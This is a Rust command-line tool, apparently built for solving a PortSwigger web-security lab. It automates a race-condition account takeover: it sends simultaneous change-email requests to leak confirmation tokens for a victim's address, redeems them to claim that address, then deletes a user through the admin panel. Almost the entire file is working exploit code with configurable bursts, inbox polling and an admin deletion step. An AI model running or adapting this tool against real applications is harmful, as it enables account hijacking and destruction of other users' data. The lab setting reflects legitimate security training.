#!/usr/bin/env rust-script
//! name: raceclaim
//! description: Single-endpoint email-change race claimer - bursts alternating change-email requests for a target address and an attacker-readable address on one session, reads the lab inbox for leaked confirmation tokens, redeems each against /confirm-email until the account's email becomes the target, then optionally deletes a user through /admin - one envelope carries the round log, the accepted token and the admin receipt.
//! version: 1.0.1
//! args: <instance> --target TARGET@ADDR --own YOU@exploit-....exploit-server.net --csrf TOK --jar JAR [--inbox URL] [--user user] [--plan OOTTTOT] [--owns 2] [--targets 8] [--rounds 8] [--try 6] [--wait-secs 12] [--wait-polls 4] [--delete-user victim] [--deadline-secs 240]
//! keywords: race, email, confirm, single-endpoint, admin, concurrent, condition
//!
//! ```cargo
//! [dependencies]
//! ureq = { version = "2" }
//! url = "2"
//! ```
use pi_rust_lib::serde_json::{self, json, Value};
use std::collections::BTreeMap;
use std::io::Read;
use std::sync::{mpsc, Arc, Barrier};
use std::time::{Duration, Instant};
use url::Url;

type Jar = BTreeMap<String, BTreeMap<String, String>>;

fn main() {
    let args: Vec<String> = std::env::args().skip(1).collect();
    let mut inst = String::new();
    let mut target = String::new();
    let mut own = String::new();
    let mut csrf = String::new();
    let mut jar_path = String::new();
    let mut inbox = String::new();
    let mut user = "user".to_string();
    let mut rounds = 8usize;
    let mut tries = 6usize;
    let mut owns = 2usize;
    let mut targets = 8usize;
    let mut plan_arg = String::new();
    let mut wait_secs = 12u64;
    let mut wait_polls = 4usize;
    let mut delete_user = String::new();
    let mut deadline_secs = 240u64;
    let mut i = 0;
    while i < args.len() {
        match args[i].as_str() {
            "--target" => { i += 1; target = arg(&args, i); }
            "--own" => { i += 1; own = arg(&args, i); }
            "--csrf" => { i += 1; csrf = arg(&args, i); }
            "--jar" => { i += 1; jar_path = arg(&args, i); }
            "--inbox" => { i += 1; inbox = arg(&args, i); }
            "--user" => { i += 1; user = arg(&args, i); }
            "--rounds" => { i += 1; rounds = arg(&args, i).parse().unwrap_or(8).max(1); }
            "--try" => { i += 1; tries = arg(&args, i).parse().unwrap_or(6).max(1); }
            "--owns" => { i += 1; owns = arg(&args, i).parse().unwrap_or(2).max(1); }
            "--targets" => { i += 1; targets = arg(&args, i).parse().unwrap_or(8).max(1); }
            "--plan" => { i += 1; plan_arg = arg(&args, i); }
            "--wait-secs" => { i += 1; wait_secs = arg(&args, i).parse().unwrap_or(12).min(60); }
            "--wait-polls" => { i += 1; wait_polls = arg(&args, i).parse().unwrap_or(4).max(1); }
            "--delete-user" => { i += 1; delete_user = arg(&args, i); }
            "--deadline-secs" => { i += 1; deadline_secs = arg(&args, i).parse().unwrap_or(240).max(10); }
            other if !other.starts_with("--") && inst.is_empty() => inst = other.to_string(),
            _ => {}
        }
        i += 1;
    }
    if inst.is_empty() || target.is_empty() || own.is_empty() || csrf.is_empty() || jar_path.is_empty() {
        pi_rust_lib::report::failure("raceclaim", "missing args", "usage: raceclaim <instance> --target T --own O --csrf TOK --jar JAR [--inbox URL]");
        std::process::exit(2);
    }
    if !inbox.starts_with("http") {
        inbox = format!("{inst}/email");
    } else if !inbox.ends_with("/email") {
        inbox = format!("{}/email", inbox.trim_end_matches('/'));
    }
    let inst = inst.trim_end_matches('/').to_string();
    let jar = load_jar(&jar_path);
    let cookie = cookie_header(&jar, &inst);
    let start = Instant::now();
    let budget = Duration::from_secs(deadline_secs);

    let change_url = format!("{inst}/my-account/change-email");
    let account_url = format!("{inst}/my-account");
    let warm_url = format!("{inst}/login");
    let confirm_base = format!("{inst}/confirm-email?user={user}&token=");
    let body_t = format!("email={target}&csrf={csrf}");
    let body_o = format!("email={own}&csrf={csrf}");

    // The own-address requests are sent from our mailbox; each one's confirmation email is
    // addressed to us while the token it carries is read from the shared pending-change row, so
    // the trailing target requests must own the last write. --plan spells the order literally
    // (O = own address, T = target address).
    let mut plan: Vec<String> = Vec::new();
    if plan_arg.is_empty() {
        for _ in 0..owns {
            plan.push(body_o.clone());
        }
        for _ in 0..targets {
            plan.push(body_t.clone());
        }
    } else {
        for c in plan_arg.chars() {
            match c {
                'o' | 'O' => plan.push(body_o.clone()),
                't' | 'T' => plan.push(body_t.clone()),
                _ => {}
            }
        }
    }
    if plan.is_empty() {
        plan.push(body_o.clone());
        plan.push(body_t.clone());
    }

    let mut log: Vec<String> = Vec::new();
    let mut accepted_token = String::new();
    let mut effective = String::new();
    let mut solved = false;
    let mut seen: std::collections::BTreeSet<String> = std::collections::BTreeSet::new();
    for round in 1..=rounds {
        if start.elapsed() > budget {
            log.push(format!("round {round}: deadline reached, stopping"));
            break;
        }
        let statuses = burst(&change_url, &warm_url, &cookie, &plan);
        let mut line = format!("round {round}: burst={statuses}");
        // The lab's mailer is asynchronous: a burst's confirmations surface over the next tens of
        // seconds, so poll the inbox and only ever redeem target-address tokens - redeeming one of
        // our own clears the pending change before the leaked target token shows up.
        for attempt in 1..=wait_polls {
            std::thread::sleep(Duration::from_secs(wait_secs));
            let (_, inbox_html) = get_body(&inbox, "");
            let cands = parse_tokens(&inbox_html, tries.max(plan.len() + 2));
            line.push_str(&format!(" | poll{attempt} newest={}", cands.first().map(|(t, to)| format!("{to}:{t}")).unwrap_or_else(|| "-".to_string())));
            let fresh: Vec<(String, String)> = cands
                .into_iter()
                .filter(|(t, to)| to == &target && !seen.contains(t))
                .collect();
            if fresh.is_empty() {
                continue;
            }
            for (token, to) in &fresh {
                seen.insert(token.clone());
                if start.elapsed() > budget {
                    line.push_str(" | deadline");
                    break;
                }
                let (status, text) = get_body(&format!("{confirm_base}{token}"), &cookie);
                if status == 200 || status == 302 {
                    let (_, acct) = get_body(&account_url, &cookie);
                    let now = extract_span(&acct, "user-email").unwrap_or_else(|| "?".to_string());
                    line.push_str(&format!(" | ACCEPTED {token} ({to}) -> {now}"));
                    accepted_token = token.clone();
                    effective = now.clone();
                    if now.contains("ginandjuice.shop") || acct.contains("carlos@ginandjuice.shop") {
                        solved = true;
                    }
                    break;
                } else if text.contains("invalid") {
                    line.push_str(&format!(" | invalid {token}"));
                }
            }
            if solved {
                break;
            }
        }
        log.push(line);
        if solved {
            break;
        }
    }

    let mut admin_receipt = String::new();
    let mut deleted = false;
    if solved && !delete_user.is_empty() {
        let (astatus, admin_html) = get_body(&format!("{inst}/admin"), &cookie);
        let acsrf = extract_input(&admin_html, "csrf").unwrap_or_default();
        if astatus == 200 && !acsrf.is_empty() {
            let (dstatus, dtext) = post_form(
                &format!("{inst}/admin/delete"),
                &cookie,
                &format!("username={delete_user}&csrf={acsrf}"),
            );
            deleted = dstatus == 200 || dstatus == 302;
            admin_receipt = format!("admin={astatus} delete={dstatus} body={}", snip(&dtext, 200));
        } else {
            admin_receipt = format!("admin={astatus} csrf_missing body={}", snip(&admin_html, 200));
        }
    }

    let next = if deleted {
        "confirm with banner_verdict (terminal page first visit flips the banner)"
    } else if solved {
        "email claimed; open /admin with the same jar and delete the target user"
    } else {
        "raise --pairs/--rounds and rerun; the write ordering did not align"
    };
    let data = json!({
        "instance": inst,
        "target": target,
        "own": own,
        "solved": solved,
        "accepted_token": accepted_token,
        "effective_email": effective,
        "admin_receipt": admin_receipt,
        "deleted": deleted,
        "rounds": log,
    });
    pi_rust_lib::report::success("raceclaim", data, next).expect("report success");
}

fn arg(args: &[String], i: usize) -> String {
    args.get(i).cloned().unwrap_or_default()
}

fn snip(s: &str, n: usize) -> String {
    s.chars().take(n).collect::<String>().replace('\n', " ")
}

/// Fire the planned request bodies simultaneously on pre-warmed connections.
fn burst(url: &str, warm_url: &str, cookie: &str, plan: &[String]) -> String {
    let total = plan.len();
    let barrier = Arc::new(Barrier::new(total));
    let (tx, rx) = mpsc::channel::<u16>();
    for idx in 0..total {
        let payload = plan[idx].clone();
        let url = url.to_string();
        let warm = warm_url.to_string();
        let cookie = cookie.to_string();
        let barrier = Arc::clone(&barrier);
        let tx = tx.clone();
        std::thread::spawn(move || {
            let agent = ureq::AgentBuilder::new().timeout(Duration::from_secs(15)).redirects(0).build();
            let _ = agent.get(&warm).call();
            barrier.wait();
            let mut req = agent.post(&url).set("Content-Type", "application/x-www-form-urlencoded");
            if !cookie.is_empty() {
                req = req.set("Cookie", &cookie);
            }
            let status = match req.send_string(&payload) {
                Ok(r) => r.status(),
                Err(ureq::Error::Status(c, _)) => c,
                Err(_) => 0,
            };
            let _ = tx.send(status);
        });
    }
    drop(tx);
    let mut counts: BTreeMap<u16, usize> = BTreeMap::new();
    for _ in 0..total {
        if let Ok(s) = rx.recv() {
            *counts.entry(s).or_insert(0) += 1;
        }
    }
    counts.iter().map(|(k, v)| format!("{k}x{v}")).collect::<Vec<_>>().join(",")
}

/// Pull (token, target-email) pairs from the inbox HTML, newest email first, capped at `max`.
fn parse_tokens(html: &str, max: usize) -> Vec<(String, String)> {
    let mut out = Vec::new();
    let mut i = 0;
    while let Some(p) = html[i..].find("token=") {
        let s = i + p + "token=".len();
        let rest = &html[s..];
        let e = rest.find(|c: char| !c.is_ascii_alphanumeric()).unwrap_or(rest.len());
        let token = rest[..e].to_string();
        let before = &html[..s];
        let target = before
            .rfind("change to ")
            .and_then(|q| {
                let r = &before[q + "change to ".len()..];
                r.find(',').map(|x| r[..x].to_string())
            })
            .unwrap_or_else(|| "?".to_string());
        if !token.is_empty() {
            out.push((token, target));
        }
        if out.len() >= max {
            break;
        }
        i = s + e;
    }
    out
}

fn get_body(url: &str, cookie: &str) -> (u16, String) {
    let agent = ureq::AgentBuilder::new().timeout(Duration::from_secs(20)).redirects(0).build();
    let mut req = agent.get(url);
    if !cookie.is_empty() {
        req = req.set("Cookie", cookie);
    }
    match req.call() {
        Ok(r) => { let s = r.status(); (s, read_body(r)) }
        Err(ureq::Error::Status(c, r)) => (c, read_body(r)),
        Err(_) => (0, String::new()),
    }
}

fn post_form(url: &str, cookie: &str, payload: &str) -> (u16, String) {
    let agent = ureq::AgentBuilder::new().timeout(Duration::from_secs(20)).redirects(0).build();
    let mut req = agent.post(url).set("Content-Type", "application/x-www-form-urlencoded");
    if !cookie.is_empty() {
        req = req.set("Cookie", cookie);
    }
    match req.send_string(payload) {
        Ok(r) => { let s = r.status(); (s, read_body(r)) }
        Err(ureq::Error::Status(c, r)) => (c, read_body(r)),
        Err(_) => (0, String::new()),
    }
}

fn read_body(resp: ureq::Response) -> String {
    let mut s = String::new();
    let _ = resp.into_reader().take(1 << 20).read_to_string(&mut s);
    s
}

fn extract_span(html: &str, id: &str) -> Option<String> {
    let marker = format!("id=\"{id}\">");
    let start = html.find(&marker)? + marker.len();
    let rest = &html[start..];
    let end = rest.find('<').unwrap_or(rest.len());
    Some(rest[..end].to_string())
}

/// Read the value of a named hidden input from a form.
fn extract_input(html: &str, name: &str) -> Option<String> {
    let marker = format!("name=\"{name}\"");
    let mut from = 0;
    while let Some(p) = html[from..].find(&marker) {
        let s = from + p;
        let window_end = (s + 200).min(html.len());
        let window = &html[s..window_end];
        if let Some(v) = window.find("value=\"") {
            let vs = s + v + "value=\"".len();
            let rest = &html[vs..];
            let e = rest.find('"').unwrap_or(rest.len());
            return Some(rest[..e].to_string());
        }
        from = s + marker.len();
    }
    None
}

fn cookie_header(jar: &Jar, inst: &str) -> String {
    let host = Url::parse(inst).ok().and_then(|u| u.host_str().map(String::from)).unwrap_or_default();
    let mut parts = Vec::new();
    for (h, cookies) in jar {
        if host == *h || host.ends_with(&format!(".{h}")) || h.ends_with(&host) {
            for (k, v) in cookies {
                parts.push(format!("{k}={v}"));
            }
        }
    }
    parts.join("; ")
}

fn load_jar(path: &str) -> Jar {
    std::fs::read_to_string(path)
        .ok()
        .and_then(|s| serde_json::from_str::<Value>(&s).ok())
        .and_then(|v| match v {
            Value::Object(hosts) => Some(
                hosts
                    .into_iter()
                    .map(|(h, c)| {
                        let map = c
                            .as_object()
                            .map(|o| o.iter().map(|(k, v)| (k.clone(), v.as_str().unwrap_or("").to_string())).collect())
                            .unwrap_or_default();
                        (h, map)
                    })
                    .collect(),
            ),
            _ => None,
        })
        .unwrap_or_default()
}
